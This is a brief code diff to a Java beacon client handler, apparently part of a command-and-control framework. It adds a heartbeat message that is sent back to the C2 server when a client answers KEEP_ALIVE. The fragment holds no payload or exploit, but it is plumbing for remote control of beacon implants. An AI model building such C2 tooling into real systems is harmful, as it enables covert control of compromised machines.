@@ -139,6 +139,8 @@ public class BeaconClientHandler implements Runnable{
                 // Send client response back to C2
                 if(!(response.equals("KEEP_ALIVE"))){
                     sendResponseToC2("client_command_response", response);
+                } else {
+                    sendResponseToC2("httpheartbeat", "httpheartbeat");
                 }
             } catch(java.net.SocketException e){
                 clientDisconnect(e);
